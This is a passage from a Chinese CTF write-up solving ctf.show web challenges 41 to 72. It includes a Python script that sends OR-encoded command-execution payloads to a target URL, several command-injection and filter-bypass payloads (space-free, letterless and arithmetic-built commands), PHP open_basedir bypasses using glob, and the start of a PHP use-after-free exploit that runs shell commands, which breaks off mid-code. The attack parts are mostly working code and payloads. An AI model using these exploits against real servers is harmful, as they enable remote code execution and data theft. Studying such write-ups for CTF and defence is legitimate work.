punctuation\">(</span><span class=\"token string\">\"eg：  python exp.py http://ctf.show/\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   \t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token operator\">*</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   \texit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>url<span class=\"token operator\">=</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">action</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   \ts1<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   \ts2<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   \t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> arg<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>       \tf<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rce_or.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>       \t<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>           \tt<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>           \t<span class=\"token keyword\">if</span> t<span class=\"token operator\">==</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>               \t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>           \t<span class=\"token keyword\">if</span> t<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>i<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>               \t<span class=\"token comment\">#print(i)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>               \ts1<span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>               \ts2<span class=\"token operator\">+=</span>t<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>               \t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>       \tf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>   \toutput<span class=\"token operator\">=</span><span class=\"token string\">\"(\\\"\"</span><span class=\"token operator\">+</span>s1<span class=\"token operator\">+</span><span class=\"token string\">\"\\\"|\\\"\"</span><span class=\"token operator\">+</span>s2<span class=\"token operator\">+</span><span class=\"token string\">\"\\\")\"</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>   \t<span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>   </pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>   \tparam<span class=\"token operator\">=</span>action<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n[+] your function：\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>action<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] your command：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   \tdata<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>       \t<span class=\"token string\">'c'</span><span class=\"token punctuation\">:</span>urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>       \t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>   \tr<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>   \t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n[*] result:\\n\"</span><span class=\"token operator\">+</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>\t\t\t\t\t\t\t-- 来源于[ yu22x 的博客文章](https://blog.csdn.net/miuzzx/article/details/108569080)\n</code></pre>\n<h2 id=\"web-42\"><a class=\"anchor\" href=\"#web-42\">#</a> web 42</h2>\n<p>双写绕过，分号分隔，分号后面被写入</p>\n<h2 id=\"web-43\"><a class=\"anchor\" href=\"#web-43\">#</a> web 43</h2>\n<p>源码类型同 42，但过滤了分号和 <code>cat</code> ，可以使用 <code>&amp;&amp;</code> , 用来分隔两个命令，如果前一个执行成功第二个不会执行</p>\n<h2 id=\"web-50-51\"><a class=\"anchor\" href=\"#web-50-51\">#</a> web 50、51</h2>\n<p>不用空格的命令</p>\n<p><code>?c=nl&lt;fla''g.php%7C%7Cls</code> ( <code>%7C%7C</code>  为 <code>||</code> ) 其中不用通配符是因为不支持，使用单引号忽略</p>\n<h2 id=\"web-55\"><a class=\"anchor\" href=\"#web-55\">#</a> web 55</h2>\n<p>无字母 RCE</p>\n<p>可以上传文件到服务器上</p>\n<p>在本地制作文件上传表单</p>\n<p>而上传后 php 会把该文件放在一个临时目录下，命名规则为 php+5 位小写字母 + 大写字母，但该文件名不可控，可以使用占位符进行匹配</p>\n<p><code>/???/????????</code>  而如果最后有大写字母，也可以写成 <code>/???/???????[@-[]</code></p>\n<p>如果点号。没有过滤，在 linux 系统里可以使用点号。用来执行脚本文件，即可写 <code>?c=.%20/???/??????[@-[]</code></p>\n<p>然后通过抓包不断修改文件的内容</p>\n<h2 id=\"web-57\"><a class=\"anchor\" href=\"#web-57\">#</a> web 57</h2>\n<p>题目只要构造出 36 即可，而 $ 没有过滤，可以使用 $(()) 进行构造</p>\n<p><code>echo $(())</code>  返回 0，取反后 <code>echo $((~$(())))</code>  即为 - 1，那么我们可以加上 37 个 - 1 再取反</p>\n<p><code>echo ~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))</code></p>\n<p>返回 36</p>\n<h2 id=\"web-62-63-64\"><a class=\"anchor\" href=\"#web-62-63-64\">#</a> web 62、63、64</h2>\n<ol>\n<li><code>include(&quot;flag.php&quot;);echo $flag;</code></li>\n<li>或者先 include 包含 flag.php，再使用 get_defined_vars (), 获取变量名及值</li>\n<li></li>\n</ol>\n<h2 id=\"web-66\"><a class=\"anchor\" href=\"#web-66\">#</a> web 66</h2>\n<p><code>var_dump(scandir('*'));var_dump(scandir ('/'));</code>  读取相关的目录</p>\n<h2 id=\"web-68\"><a class=\"anchor\" href=\"#web-68\">#</a> web 68</h2>\n<p><code>highlight_file</code>  被禁，用 <code>include</code> ， <code>include ('/flag.txt');</code>  因为没有 php 代码，则直接输出</p>\n<h2 id=\"web-71\"><a class=\"anchor\" href=\"#web-71\">#</a> web 71</h2>\n<p>内容被替换</p>\n<p>思路为提前结束，不执行下面的代码</p>\n<p><code>include('flag.txt');exit();</code></p>\n<h2 id=\"web-72\"><a class=\"anchor\" href=\"#web-72\">#</a> web 72</h2>\n<p><code>var_dump()</code>  被禁</p>\n<p><code>scandir('/')</code>  不能正确读取，因为有了 <code>open_basedir()</code> , 而 <code>ini_set ()</code>  也被禁用，不能修改</p>\n<p>那么可以使用 <code>glob</code>  协议进行绕过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"glob:///*.txt\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">opendir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">readdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"filename:\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">closedir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 为了绕过后面的替换内容</span></pre></td></tr></table></figure><p>虽然知道 flag 的文件名，但是无法读取</p>\n<p>这里要采用 uaf 的脚本</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat /flag0.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Vuln</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">getTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\"># ;)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\"># PHP >= 7.4</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token function\">debug_backtrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Helper</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$address</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$s</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span><span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$address</span> <span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token variable\">$address</span> <span class=\"token operator\">|=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span><span class=\"token operator\">+</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$address</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ptr2str</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$out</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token variable\">$out</span> <span class=\"token operator\">.=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token variable\">$ptr</span> <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">write</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token variable\">$v</span> <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">!=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">%=</span> <span class=\"token number\">2</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$leak</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token variable\">$e_type</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token variable\">$e_phentsize</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token variable\">$e_phnum</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$e_phnum</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$e_phentsize</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token variable\">$p_type</span>  <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>            <span class=\"token variable\">$p_vaddr</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            <span class=\"token variable\">$p_memsz</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span 